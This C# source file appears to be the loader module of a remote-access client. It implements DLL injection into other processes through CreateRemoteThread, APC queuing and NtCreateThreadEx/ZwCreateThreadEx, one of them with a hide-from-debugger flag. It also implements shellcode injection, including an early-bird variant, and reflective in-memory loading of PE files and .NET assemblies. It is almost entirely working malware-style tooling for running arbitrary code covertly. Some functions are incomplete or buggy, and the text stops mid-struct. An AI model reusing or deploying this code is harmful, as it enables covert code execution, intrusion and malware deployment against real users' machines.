using NAudio.Wave;
using Plugin.Abstractions48;
using System;
using System.CodeDom;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;

namespace winClient48
{
    internal class clsfnLoader
    {
        public clsfnLoader()
        {

        }

        #region DLL Injection

        private string fnSaveDll(byte[] abDllBytes)
        {
            string szTempDllPath = clsEZData.fnGetNewTempFilePath("dll");
            File.WriteAllBytes(szTempDllPath, abDllBytes);
            if (!File.Exists(szTempDllPath))
                throw new Exception("Write file failed: " + szTempDllPath);

            return szTempDllPath;
        }

        public (int nCode, string szMsg) fnApcDLL(int nProcID, byte[] abDllBytes)
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                if (Process.GetProcessById(nProcID) == null)
                    throw new Exception($"Cannot find process with ID: {nProcID}");

                string szDllPath = fnSaveDll(abDllBytes);

                IntPtr hProcess = WinAPI.OpenProcess(
                    WinAPI.PROCESS_CREATE_THREAD |
                    WinAPI.PROCESS_QUERY_INFORMATION |
                    WinAPI.PROCESS_VM_OPERATION |
                    WinAPI.PROCESS_VM_READ |
                    WinAPI.PROCESS_VM_WRITE,
                    false, 
                    nProcID
                );

                if (hProcess == IntPtr.Zero)
                    throw new Exception($"Failed to open process with ID: {nProcID}");

                byte[] abDllPathByte = Encoding.Unicode.GetBytes(szDllPath);
                IntPtr lpBaseAddress = WinAPI.VirtualAllocEx(hProcess, IntPtr.Zero, (uint)abDllPathByte.Length, WinAPI.MEM_COMMIT | WinAPI.MEM_RESERVE, WinAPI.PAGE_READWRITE);
                if (lpBaseAddress == IntPtr.Zero)
                    throw new Exception($"Failed to allocate memory in remote process. Error code: {WinAPI.GetLastError()}");

                uint nBytesWritten = 0;
                bool bSuccess = WinAPI.WriteProcessMemory(hProcess, lpBaseAddress, abDllPathByte, (uint)abDllPathByte.Length, out nBytesWritten);
                if (!bSuccess || nBytesWritten != abDllPathByte.Length)
                    throw new Exception($"Failed to write DLL path to remote process. Error code: {WinAPI.GetLastError()}");

                IntPtr pKernel32Handle = WinAPI.GetModuleHandle("kernel32.dll");
                IntPtr pLoadLibraryAAddress = WinAPI.GetProcAddress(pKernel32Handle, "LoadLibraryA");

                IntPtr hThread = IntPtr.Zero;
                WinAPI.CreateRemoteThread(hProcess, IntPtr.Zero, 0, pLoadLibraryAAddress, lpBaseAddress, 0, out hThread);
                if (hThread == IntPtr.Zero)
                    throw new Exception($"Failed to create remote thread. Error code: {WinAPI.GetLastError()}");

                IntPtr hApcQueued = WinAPI.QueueUserAPC(pLoadLibraryAAddress, hThread, IntPtr.Zero);
                if (hApcQueued == IntPtr.Zero)
                    throw new Exception($"Failed to queue APC. Error code {WinAPI.GetLastError()}");

                nCode = 1;
                szMsg = "APC injection is successful.";
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }

        public (int nCode, string szMsg) fnEarlyBirdDll(int nProcId, byte[] abDllBytes)
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                if (null == Process.GetProcessById(nProcId))
                    throw new Exception($"Cannot find process with ID: {nProcId}");

                string szDllPath = fnSaveDll(abDllBytes);




                nCode = 1;
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }

        public (int nCode, string szMsg) fnRemoteCreateThreadDLL(int nProc, byte[] abDllBytes)
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                Process proc = Process.GetProcessById(nProc);
                if (proc == null)
                    throw new Exception($"Cannot get process with ID: {nProc}");

                IntPtr hProc = WinAPI.OpenProcess((uint)WinAPI.ProcessAccessFlags.All, false, nProc);
                string szTempDllPath = clsEZData.fnGetNewTempFilePath("dll");
                File.WriteAllBytes(szTempDllPath, abDllBytes);
                if (!File.Exists(szTempDllPath))
                    throw new Exception("Write file failed: " + szTempDllPath);

                IntPtr pLibraryAddr = WinAPI.GetProcAddress(WinAPI.GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                if (IntPtr.Zero == pLibraryAddr)
                    throw new Exception($"GetProcAddress() failed. Error code: {WinAPI.GetLastError()}");
                
                IntPtr pAllocMemAddr = WinAPI.VirtualAllocEx(hProc, IntPtr.Zero, (uint)((szTempDllPath.Length + 1) * Marshal.SizeOf(typeof(char))), WinAPI.MEM_COMMIT | WinAPI.MEM_RESERVE, WinAPI.PAGE_READWRITE);
                if (IntPtr.Zero == pAllocMemAddr)
                    throw new Exception($"Allocating memory space failed. Error code: {WinAPI.GetLastError()}");

                uint nWritten;
                WinAPI.WriteProcessMemory(hProc, pAllocMemAddr, Encoding.Default.GetBytes(szTempDllPath), (uint)((szTempDllPath.Length + 1) * Marshal.SizeOf(typeof(char))), out nWritten);
                if (0 == nWritten)
                    throw new Exception($"Write process memory failed. Error code: {WinAPI.GetLastError()}");

                IntPtr hThread = IntPtr.Zero;
                WinAPI.CreateRemoteThread(hProc, IntPtr.Zero, 0, pLibraryAddr, pAllocMemAddr, 0, out hThread);
                if (IntPtr.Zero == hThread)
                    throw new Exception($"CreateRemoteThread() failed. Error code: {WinAPI.GetLastError()}");

                szMsg = "CreateRemoteThread() injection is successful.";

                nCode = 1;
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }

        public (int nCode, string szMsg) fnNtCreateThreadExDll(int nProcId, byte[] abDllBytes)
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                Process proc = Process.GetProcessById(nProcId);
                if (null == proc)
                    throw new Exception($"Cannot find process with ID: {nProcId}");

                string szDllPath = fnSaveDll(abDllBytes);
                IntPtr hProc = WinAPI.OpenProcess(WinAPI.PROCESS_ALL_ACCESS, false, nProcId);
                if (IntPtr.Zero == hProc)
                    throw new Exception($"OpenProcess() failed. Error code: {WinAPI.GetLastError()}");
                
                IntPtr pAddrLoadLibrary = WinAPI.GetProcAddress(WinAPI.GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                IntPtr pAddrRemoteMemory = WinAPI.VirtualAllocEx(hProc, IntPtr.Zero, (uint)(szDllPath.Length + 1), 0x3000, 0x40);

                byte[] abDllPath = Encoding.ASCII.GetBytes(szDllPath);
                if (!WinAPI.WriteProcessMemory(hProc, pAddrRemoteMemory, abDllPath, (uint)abDllPath.Length, out _))
                    throw new Exception($"WriteProcessMemory() failed. Error code: {WinAPI.GetLastError()}");

                IntPtr hThread = IntPtr.Zero;
                uint nResult = WinAPI.NtCreateThreadEx(out hThread, 0x1FFFFF, IntPtr.Zero, hProc, pAddrLoadLibrary, pAddrRemoteMemory, false, 0, 0, 0, IntPtr.Zero);
                if ((uint)WinAPI.NTSTATUS.Error == nResult)
                    throw new Exception($"NtCreateThreadEx() failed. Error: {WinAPI.GetLastError()}");

                nCode = 1;
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }

        public (int nCode, string szMsg) fnZwCreateThreadExDll(int nProcId, byte[] abDllBytes)
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                if (null == Process.GetProcessById(nProcId))
                    throw new Exception($"Cannot find any process with ID: {nProcId}");

                IntPtr hProc = WinAPI.OpenProcess(WinAPI.PROCESS_CREATE_THREAD | WinAPI.PROCESS_QUERY_INFORMATION | WinAPI.PROCESS_VM_OPERATION | WinAPI.PROCESS_VM_WRITE | WinAPI.PROCESS_VM_READ, false, nProcId);
                if (IntPtr.Zero == hProc)
                    throw new Exception($"OpenProcess() failed. Error code: {WinAPI.GetLastError()}");

                string szDllPath = fnSaveDll(abDllBytes);
                byte[] abDllPath = Encoding.UTF8.GetBytes(szDllPath);

                IntPtr lpBaseAddress = WinAPI.VirtualAllocEx(hProc, IntPtr.Zero, (uint)abDllPath.Length, WinAPI.MEM_COMMIT | WinAPI.MEM_RESERVE, WinAPI.PAGE_EXECUTE_READWRITE);
                if (IntPtr.Zero == lpBaseAddress)
                    throw new Exception($"VirtualAllocEx() failed. Error code: {WinAPI.GetLastError()}");

                uint nWritten;
                if (!WinAPI.WriteProcessMemory(hProc, lpBaseAddress, abDllPath, (uint)abDllPath.Length, out nWritten))
                    throw new Exception($"Write process memory failed. Error code: {WinAPI.GetLastError()}");

                IntPtr pAddrLoadLibrary = WinAPI.GetProcAddress(WinAPI.GetModuleHandle("kernel32.dll"), "LoadLibraryW");
                if (IntPtr.Zero == lpBaseAddress)
                    throw new Exception($"GetProcAddress() failed. Error code: {WinAPI.GetLastError()}");

                IntPtr hThread;
                uint nDesiredAccess = (uint)(WinAPI.ThreadCreateFlags.THREAD_CREATE_FLAGS_CREATE_SUSPENDED | WinAPI.ThreadCreateFlags.THREAD_CREATE_FLAGS_SKIP_THREAD_ATTACH | WinAPI.ThreadCreateFlags.THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER);
                if ((uint)WinAPI.NTSTATUS.Success != WinAPI.ZwCreateThreadEx(
                    out hThread,
                    nDesiredAccess,
                    IntPtr.Zero,
                    hProc,
                    pAddrLoadLibrary,
                    lpBaseAddress, 0, 0, 0, 0, IntPtr.Zero)
                )
                    throw new Exception($"ZwCreateThreadEx() failed. Error code: {nDesiredAccess}");

                szMsg = "ZwCreateThreadEx Injection is successful.";

                nCode = 1;
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }

        #endregion

        #region Shellcode Injection

        public (int nCode, string szMsg) fnApcSC(int nProcId, byte[] abShellCode)
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                Process proc = Process.GetProcessById(nProcId);
                if (proc == null)
                    throw new Exception($"Cannot find process with ID: {nProcId}");

                string szExePath = proc.MainModule.FileName;
                WinAPI.STARTUPINFO si = new WinAPI.STARTUPINFO();
                WinAPI.PROCESS_INFORMATION pi = new WinAPI.PROCESS_INFORMATION();

                // Create new process in suspended state to inject into
                bool success = WinAPI.CreateProcess(szExePath, null,
                    IntPtr.Zero, IntPtr.Zero, false,
                    WinAPI.CreationFlags.CREATE_SUSPENDED,
                    IntPtr.Zero, null, ref si, out pi);

                // Allocate memory within process and write shellcode
                IntPtr resultPtr = WinAPI.VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)abShellCode.Length, WinAPI.MEM_COMMIT, WinAPI.PAGE_READWRITE);

                uint nWritten;
                bool resultBool = WinAPI.WriteProcessMemory(pi.hProcess, resultPtr, abShellCode, (uint)abShellCode.Length, out nWritten);

                // Open thread
                IntPtr sht = WinAPI.OpenThread((int)WinAPI.ThreadAccess.SET_CONTEXT, false, (uint)pi.dwThreadId);
                uint oldProtect = 0;

                // Modify memory permissions on allocated shellcode
                resultBool = WinAPI.VirtualProtectEx(pi.hProcess, resultPtr, abShellCode.Length, WinAPI.PAGE_EXECUTE_READ, out oldProtect);

                // Assign address of shellcode to the target thread apc queue
                IntPtr ptr = WinAPI.QueueUserAPC(resultPtr, sht, IntPtr.Zero);

                IntPtr ThreadHandle = pi.hThread;
                WinAPI.ResumeThread(ThreadHandle);

                nCode = 1;
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }

        public (int nCode, string szMsg) fnEarlyBirdSC(int nProcId, byte[] abShellCode)
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                IntPtr Process_handle = WinAPI.OpenProcess((uint)WinAPI.ProcessAccessFlags.All, false, nProcId);
                if (IntPtr.Zero == Process_handle)
                    throw new Exception($"OpenProcess() failed. Error code: {WinAPI.GetLastError()}");
                
                IntPtr VAlloc_address = WinAPI.VirtualAllocEx(
                    Process_handle,
                    IntPtr.Zero,
                    (uint)abShellCode.Length,
                    (uint)WinAPI.AllocationType.Commit,
                    (uint)WinAPI.AllocationProtect.PAGE_EXECUTE_READWRITE);
                if (IntPtr.Zero == VAlloc_address)
                    throw new Exception($"VirtualAllocEx() failed. Error code: {WinAPI.GetLastError()}");

                IntPtr buf1_address = Marshal.AllocHGlobal(abShellCode.Length);
                if (IntPtr.Zero == buf1_address)
                    throw new Exception($"AllocHGlobal() failed. Error code: {WinAPI.GetLastError()}");

                WinAPI.RtlZeroMemory(buf1_address, abShellCode.Length);

                UInt32 getsize = 0;
                WinAPI.NTSTATUS ntstatus = WinAPI.NtWriteVirtualMemory(Process_handle, VAlloc_address, abShellCode, (uint)abShellCode.Length, ref getsize);
                if (WinAPI.NTSTATUS.Error == ntstatus)
                    throw new Exception($"NtWriteVirtualMemory() failed. Error code: {WinAPI.GetLastError()}");

                IntPtr hThread = IntPtr.Zero;
                WinAPI.CreateRemoteThread(
                    Process_handle,
                    IntPtr.Zero,
                    0,
                    (IntPtr)buf1_address,
                    IntPtr.Zero,
                    (uint)WinAPI.CreationFlags.CREATE_SUSPENDED,
                    out hThread);
                if (IntPtr.Zero == hThread)
                    throw new Exception($"CreateRemoteThread() failed. Error code: {WinAPI.GetLastError()}");

                WinAPI.QueueUserAPC(VAlloc_address, hThread, IntPtr.Zero);
                WinAPI.ResumeThread(hThread);
                WinAPI.CloseHandle(Process_handle);
                WinAPI.CloseHandle(hThread);

                nCode = 1;
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }

        public (int nCode, string szMsg) fnCreateRemoteThreadSC(int nProcId, byte[] abShellCode)
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                Process proc = Process.GetProcessById(nProcId);
                if (proc == null)
                    throw new Exception($"Cannot find process with ID: {nProcId}");

                int nShellcodeSize = abShellCode.Length;
                uint bytesWritten = 0;

                IntPtr procHandle = WinAPI.OpenProcess((uint)WinAPI.ProcessAccessFlags.All, false, nProcId);
                IntPtr init = WinAPI.VirtualAllocEx(procHandle, IntPtr.Zero, (uint)nShellcodeSize, WinAPI.MEM_COMMIT, WinAPI.PAGE_READWRITE);
                WinAPI.WriteProcessMemory(procHandle, init, abShellCode, (uint)nShellcodeSize, out bytesWritten);

                uint oldProtect;
                WinAPI.VirtualProtectEx(procHandle, init, abShellCode.Length, WinAPI.PAGE_EXECUTE_READ, out oldProtect);

                IntPtr hThread = IntPtr.Zero;
                WinAPI.CreateRemoteThread(procHandle, IntPtr.Zero, 0, init, IntPtr.Zero, 0, out hThread);
                if (IntPtr.Zero == hThread)
                    throw new Exception($"CreateRemoteThread() failed. Error code: {WinAPI.GetLastError()}");

                szMsg = "Shellcode injection is successful.";

                nCode = 1;
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }

        #endregion

        #region Loader

        public (int nCode, string szMsg) fnLdrLoadDll(byte[] abDllBytes)
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                string szDllPath = fnSaveDll(abDllBytes);

                WinAPI.UnicodeString uModuleName = new WinAPI.UnicodeString();
                WinAPI.RtlInitUnicodeString(ref uModuleName, szDllPath);

                IntPtr hModule = IntPtr.Zero;
                WinAPI.LdrLoadDll(null, 0, ref uModuleName, out hModule);

                if (IntPtr.Zero == hModule)
                    throw new Exception($"LdrLoadDll() failed. Error code: {WinAPI.GetLastError()}");

                nCode = 1;
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }

        /// <summary>
        /// Perform DLL injection with reflective method.
        /// </summary>
        /// <param name="abShellCode"></param>
        /// <param name="nProcId"></param>
        /// <returns></returns>
        public (int nCode, string szMsg) fnShellCodeLoader(byte[] abShellCode)
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                IntPtr funcAddr = WinAPI.VirtualAlloc(
                             IntPtr.Zero,
                             (uint)abShellCode.Length,
                             WinAPI.MEM_COMMIT,
                             WinAPI.PAGE_EXECUTE_READWRITE);
                Marshal.Copy(abShellCode, 0, (IntPtr)(funcAddr), abShellCode.Length);

                IntPtr hThread = IntPtr.Zero;
                uint threadId = 0;
                IntPtr pinfo = IntPtr.Zero;

                hThread = WinAPI.CreateThread(IntPtr.Zero, 0, funcAddr, pinfo, 0, out threadId);
                WinAPI.WaitForSingleObject(hThread, 0xFFFFFFFF);

                szMsg = "Shellcode injected successfully.";

                nCode = 1;
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }

        public (int nCode, string szMsg) fnLoadPeIntoMemory(byte[] abFileBytes)
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                PELoader pe = new PELoader(abFileBytes);

                Console.WriteLine("Preferred Load Address = {0}", pe.OptionalHeader64.ImageBase.ToString("X4"));

                IntPtr codebase = IntPtr.Zero;

                codebase = NativeDeclarations.VirtualAlloc(IntPtr.Zero, pe.OptionalHeader64.SizeOfImage, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);

                Console.WriteLine("Allocated Space For {0} at {1}", pe.OptionalHeader64.SizeOfImage.ToString("X4"), codebase.ToString("X4"));

                //Copy Sections
                for (int i = 0; i < pe.FileHeader.NumberOfSections; i++)
                {

                    IntPtr y = NativeDeclarations.VirtualAlloc(IntPtr.Add(codebase, (int)pe.ImageSectionHeaders[i].VirtualAddress), pe.ImageSectionHeaders[i].SizeOfRawData, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);
                    Marshal.Copy(pe.RawBytes, (int)pe.ImageSectionHeaders[i].PointerToRawData, y, (int)pe.ImageSectionHeaders[i].SizeOfRawData);
                    Console.WriteLine("Section {0}, Copied To {1}", new string(pe.ImageSectionHeaders[i].Name), y.ToString("X4"));
                }

                //Perform Base Relocation
                //Calculate Delta
                long currentbase = (long)codebase.ToInt64();
                long delta;

                delta = (long)(currentbase - (long)pe.OptionalHeader64.ImageBase);


                Console.WriteLine("Delta = {0}", delta.ToString("X4"));

                //Modify Memory Based On Relocation Table

                //Console.WriteLine(pe.OptionalHeader64.BaseRelocationTable.VirtualAddress.ToString("X4"));
                //Console.WriteLine(pe.OptionalHeader64.BaseRelocationTable.Size.ToString("X4"));

                IntPtr relocationTable = (IntPtr.Add(codebase, (int)pe.OptionalHeader64.BaseRelocationTable.VirtualAddress));
                //Console.WriteLine(relocationTable.ToString("X4"));

                NativeDeclarations.IMAGE_BASE_RELOCATION relocationEntry = new NativeDeclarations.IMAGE_BASE_RELOCATION();
                relocationEntry = (NativeDeclarations.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(relocationTable, typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));
                //Console.WriteLine(relocationEntry.VirtualAdress.ToString("X4"));
                //Console.WriteLine(relocationEntry.SizeOfBlock.ToString("X4"));

                int imageSizeOfBaseRelocation = Marshal.SizeOf(typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));
                IntPtr nextEntry = relocationTable;
                int sizeofNextBlock = (int)relocationEntry.SizeOfBlock;
                IntPtr offset = relocationTable;

                while (true)
                {

                    NativeDeclarations.IMAGE_BASE_RELOCATION relocationNextEntry = new NativeDeclarations.IMAGE_BASE_RELOCATION();
                    IntPtr x = IntPtr.Add(relocationTable, sizeofNextBlock);
                    relocationNextEntry = (NativeDeclarations.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(x, typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));


                    IntPtr dest = IntPtr.Add(codebase, (int)relocationEntry.VirtualAdress);


                    //Console.WriteLine("Section Has {0} Entires",(int)(relocationEntry.SizeOfBlock - imageSizeOfBaseRelocation) /2);
                    //Console.WriteLine("Next Section Has {0} Entires", (int)(relocationNextEntry.SizeOfBlock - imageSizeOfBaseRelocation) / 2);

                    for (int i = 0; i < (int)((relocationEntry.SizeOfBlock - imageSizeOfBaseRelocation) / 2); i++)
                    {

                        IntPtr patchAddr;
                        UInt16 value = (UInt16)Marshal.ReadInt16(offset, 8 + (2 * i));

                        UInt16 type = (UInt16)(value >> 12);
                        UInt16 fixup = (UInt16)(value & 0xfff);
                        //Console.WriteLine("{0}, {1}, {2}", value.ToString("X4"), type.ToString("X4"), fixup.ToString("X4"));

                        switch (type)
                        {
                            case 0x0:
                                break;
                            case 0xA:
                                patchAddr = IntPtr.Add(dest, fixup);
                                //Add Delta To Location.
                                long originalAddr = Marshal.ReadInt64(patchAddr);
                                Marshal.WriteInt64(patchAddr, originalAddr + delta);
                                break;

                        }

                    }

                    offset = IntPtr.Add(relocationTable, sizeofNextBlock);
                    sizeofNextBlock += (int)relocationNextEntry.SizeOfBlock;
                    relocationEntry = relocationNextEntry;

                    nextEntry = IntPtr.Add(nextEntry, sizeofNextBlock);

                    if (relocationNextEntry.SizeOfBlock == 0) break;


                }


                //Resolve Imports

                IntPtr z = IntPtr.Add(codebase, (int)pe.ImageSectionHeaders[1].VirtualAddress);
                IntPtr oa1 = IntPtr.Add(codebase, (int)pe.OptionalHeader64.ImportTable.VirtualAddress);
                int oa2 = Marshal.ReadInt32(IntPtr.Add(oa1, 16));

                //Get And Display Each DLL To Load
                for (int j = 0; j < 999; j++) //HardCoded Number of DLL's Do this Dynamically.
                {
                    IntPtr a1 = IntPtr.Add(codebase, (20 * j) + (int)pe.OptionalHeader64.ImportTable.VirtualAddress);
                    int entryLength = Marshal.ReadInt32(IntPtr.Add(a1, 16));
                    IntPtr a2 = IntPtr.Add(codebase, (int)pe.ImageSectionHeaders[1].VirtualAddress + (entryLength - oa2)); //Need just last part? 
                    IntPtr dllNamePTR = (IntPtr)(IntPtr.Add(codebase, +Marshal.ReadInt32(IntPtr.Add(a1, 12))));
                    string DllName = Marshal.PtrToStringAnsi(dllNamePTR);
                    if (DllName == "") { break; }

                    IntPtr handle = NativeDeclarations.LoadLibrary(DllName);
                    Console.WriteLine("Loaded {0}", DllName);
                    for (int k = 1; k < 9999; k++)
                    {
                        IntPtr dllFuncNamePTR = (IntPtr.Add(codebase, +Marshal.ReadInt32(a2)));
                        string DllFuncName = Marshal.PtrToStringAnsi(IntPtr.Add(dllFuncNamePTR, 2));
                        //Console.WriteLine("Function {0}", DllFuncName);
                        IntPtr funcAddy = NativeDeclarations.GetProcAddress(handle, DllFuncName);
                        Marshal.WriteInt64(a2, (long)funcAddy);
                        a2 = IntPtr.Add(a2, 8);
                        if (DllFuncName == "") break;

                    }
                    //Console.ReadLine();
                }

                //Transfer Control To OEP
                Console.WriteLine("Executing loaded PE");
                IntPtr threadStart = IntPtr.Add(codebase, (int)pe.OptionalHeader64.AddressOfEntryPoint);
                IntPtr hThread = NativeDeclarations.CreateThread(IntPtr.Zero, 0, threadStart, IntPtr.Zero, 0, IntPtr.Zero);
                NativeDeclarations.WaitForSingleObject(hThread, 0xFFFFFFFF);

                Console.WriteLine("Thread Complete");

                nCode = 1;
            }
            catch (AccessViolationException ex)
            {
                szMsg = ex.Message;
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }

        public (int nCode, string szMsg) fnLoadDotNetDll(byte[] abDllByte, string szTypeName, string szMethodName)
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                Assembly asm = Assembly.Load(abDllByte);
                Type type = asm.GetType(szTypeName);
                MethodInfo method = type.GetMethod(szMethodName);

                object obj = Activator.CreateInstance(type);
                method.Invoke(obj, null);

                nCode = 1;
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }

        public (int nCode, string szMsg) fnLoadDotNetExe(byte[] abBuffer, string[] args)
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                Assembly asm = Assembly.Load(abBuffer);
                MethodInfo entry = asm.EntryPoint;

                object[] para = entry.GetParameters().Length == 0 ? null : new object[] { args };

                entry.Invoke(null, para);

                nCode = 1;
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }

        #endregion

        public class PELoader
        {
            //Acknowledgement: https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/PEloader.cs

            public struct IMAGE_DOS_HEADER
            {      // DOS .EXE header
                public UInt16 e_magic;              // Magic number
                public UInt16 e_cblp;               // Bytes on last page of file
                public UInt16 e_cp;                 // Pages in file
                public UInt16 e_crlc;               // Relocations
                public UInt16 e_cparhdr;            // Size of header in paragraphs
                public UInt16 e_minalloc;           // Minimum extra paragraphs needed
                public UInt16 e_maxalloc;           // Maximum extra paragraphs needed
                public UInt16 e_ss;                 // Initial (relative) SS value
                public UInt16 e_sp;                 // Initial SP value
                public UInt16 e_csum;               // Checksum
                public UInt16 e_ip;                 // Initial IP value
                public UInt16 e_cs;                 // Initial (relative) CS value
                public UInt16 e_lfarlc;             // File address of relocation table
                public UInt16 e_ovno;               // Overlay number
                public UInt16 e_res_0;              // Reserved words
                public UInt16 e_res_1;              // Reserved words
                public UInt16 e_res_2;              // Reserved words
                public UInt16 e_res_3;              // Reserved words
                public UInt16 e_oemid;              // OEM identifier (for e_oeminfo)
                public UInt16 e_oeminfo;            // OEM information; e_oemid specific
                public UInt16 e_res2_0;             // Reserved words
                public UInt16 e_res2_1;             // Reserved words
                public UInt16 e_res2_2;             // Reserved words
                public UInt16 e_res2_3;             // Reserved words
                public UInt16 e_res2_4;             // Reserved words
                public UInt16 e_res2_5;             // Reserved words
                public UInt16 e_res2_6;             // Reserved words
                public UInt16 e_res2_7;             // Reserved words
                public UInt16 e_res2_8;             // Reserved words
                public UInt16 e_res2_9;             // Reserved words
                public UInt32 e_lfanew;             // File address of new exe header
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct IMAGE_DATA_DIRECTORY
            {
                public UInt32 VirtualAddress;
                public UInt32 Size;
            }

            [StructLayout(LayoutKind.Sequential, Pack = 1)]
            public struct IMAGE_OPTIONAL_HEADER32
            {
                public UInt16 Magic;
                public Byte MajorLinkerVersion;
                public Byte MinorLinkerVersion;
                public UInt32 SizeOfCode;
                public UInt32 SizeOfInitializedData;
                public UInt32 SizeOfUninitializedData;
                public UInt32 AddressOfEntryPoint;
                public UInt32 BaseOfCode;
                public UInt32 BaseOfData;
                public UInt32 ImageBase;
                public UInt32 SectionAlignment;
                public UInt32 FileAlignment;
                public UInt16 MajorOperatingSystemVersion;
                public UInt16 MinorOperatingSystemVersion;
                public UInt16 MajorImageVersion;
                public UInt16 MinorImageVersion;
                public UInt16 MajorSubsystemVersion;
                public UInt16 MinorSubsystemVersion;
                public UInt32 Win32VersionValue;
                public UInt32 SizeOfImage;
                public UInt32 SizeOfHeaders;
                public UInt32 CheckSum;
                public UInt16 Subsystem;
                public UInt16 DllCharacteristics;
                public UInt32 SizeOfStackReserve;
                public UInt32 SizeOfStackCommit;
                public UInt32 SizeOfHeapReserve;
                public UInt32 SizeOfHeapCommit;
                public UInt32 LoaderFlags;
                public UInt32 NumberOfRvaAndSizes;

                public IMAGE_DATA_DIRECTORY ExportTable;
                public IMAGE_DATA_DIRECTORY ImportTable;
                public IMAGE_DATA_DIRECTORY ResourceTable;
                public IMAGE_DATA_DIRECTORY ExceptionTable;
                public IMAGE_DATA_DIRECTORY CertificateTable;
                public IMAGE_DATA_DIRECTORY BaseRelocationTable;
                public IMAGE_DATA_DIRECTORY Debug;
                public IMAGE_DATA_DIRECTORY Architecture;
                public IMAGE_DATA_DIRECTORY GlobalPtr;
                public IMAGE_DATA_DIRECTORY TLSTable;
                public IMAGE_DATA_DIRECTORY LoadConfigTable;
                public IMAGE_DATA_DIRECTORY BoundImport;
                public IMAGE_DATA_DIRECTORY IAT;
                public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
                public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
                public IMAGE_DATA_DIRECTORY Reserved;
            }

            [StructLayout(LayoutKind.Sequential, Pack = 1)]
            public struct IMAGE_OPTIONAL_HEADER64
            {
                public UInt16 Magic;
                public Byte MajorLinkerVersion;
                public Byte MinorLinkerVersion;
                public UInt32 SizeOfCode;
                public UInt32 SizeOfInitializedData;
                public UInt32 SizeOfUninitializedData;
                public UInt32 AddressOfEntryPoint;
                public UInt32 BaseOfCode;
                public UInt64 ImageBase;
                public UInt32 SectionAlignment;
                public UInt32 FileAlignment;
                public UInt16 MajorOperatingSystemVersion;
                public UInt16 MinorOperatingSystemVersion;
                public UInt16 MajorImageVersion;
                public UInt16 MinorImageVersion;
                public UInt16 MajorSubsystemVersion;
                public UInt16 MinorSubsystemVersion;
                public UInt32 Win32VersionValue;
                public UInt32 SizeOfImage;
                public UInt32 SizeOfHeaders;
                public UInt32 CheckSum;
                public UInt16 Subsystem;
                public UInt16 DllCharacteristics;
                public UInt64 SizeOfStackReserve;
                public UInt64 SizeOfStackCommit;
                public UInt64 SizeOfHeapReserve;
                public UInt64 SizeOfHeapCommit;
                public UInt32 LoaderFlags;
                public UInt32 NumberOfRvaAndSizes;

                public IMAGE_DATA_DIRECTORY ExportTable;
                public IMAGE_DATA_DIRECTORY ImportTable;
                public IMAGE_DATA_DIRECTORY ResourceTable;
                public IMAGE_DATA_DIRECTORY ExceptionTable;
                public IMAGE_DATA_DIRECTORY CertificateTable;
                public IMAGE_DATA_DIRECTORY BaseRelocationTable;
                public IMAGE_DATA_DIRECTORY Debug;
                public IMAGE_DATA_DIRECTORY Architecture;
                public IMAGE_DATA_DIRECTORY GlobalPtr;
                public IMAGE_DATA_DIRECTORY TLSTable;
                public IMAGE_DATA_DIRECTORY LoadConfigTable;
                public IMAGE_DATA_DIRECTORY BoundImport;
                public IMAGE_DATA_DIRECTORY IAT;
                public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
                public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
                public IMAGE_DATA_DIRECTORY Reserved;
            }

            [StructLayout(LayoutKind.Sequential, Pack = 1)]
            public struct IMAGE_FILE_HEADER
            {
                public UInt16 Machine;
